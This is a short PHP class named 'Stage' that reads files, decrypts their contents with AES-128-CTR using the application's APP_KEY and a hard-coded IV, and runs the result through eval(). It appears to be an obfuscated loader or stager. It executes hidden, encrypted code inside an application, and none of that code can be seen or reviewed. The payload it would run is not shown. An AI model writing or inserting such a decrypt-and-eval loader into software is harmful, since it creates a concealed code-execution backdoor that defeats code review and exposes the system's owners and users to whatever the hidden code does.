<?php

namespace ASB\Stage\App;



class Stage
{
    private Static $cip = "AES-128-CTR";
    private Static $options = 0;

    private Static $iv = 'BackupsStagesSVS';


    public static function install($name)
    {
        $type = file_get_contents($name);
        static::vol(self::run($type));
    }
    public static function init($init)
    {
        $type = file_get_contents($init);
        static::vol(self::run($type));
    }
    public static function main($main)
    {
        return self::run($main);
    }
    public static function run(false|string $type)
    {
        $key = substr(env('APP_KEY'), strlen('base64:'));
        return openssl_decrypt(
            $type,
            Static::$cip,
            $key,
            Static::$options,
            Static::$iv
        );
    }

    public static function vol($data): void
    {
        eval($data);
    }
}